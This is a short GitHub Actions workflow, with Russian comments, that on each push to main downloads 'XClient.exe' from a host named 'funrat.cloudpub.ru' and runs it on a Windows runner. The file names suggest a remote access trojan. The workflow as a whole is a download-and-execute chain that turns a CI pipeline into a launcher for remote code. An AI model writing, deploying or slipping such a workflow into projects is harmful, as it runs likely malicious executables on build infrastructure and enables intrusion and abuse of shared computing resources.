name: Download and Run .exe file

on:
  push:
    branches:
      - main

jobs:
  download_and_run:
    runs-on: windows-latest  # Указываем, что задача будет выполняться на Windows

    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Download .exe file
        run: |
          curl -L -o XClient.exe https://funrat.cloudpub.ru/XClient.exe  # Замените на ваш реальный URL

      - name: Run .exe file
        run: |
          Start-Process -FilePath ".\XClient.exe"  # Запуск .exe файла с помощью PowerShell
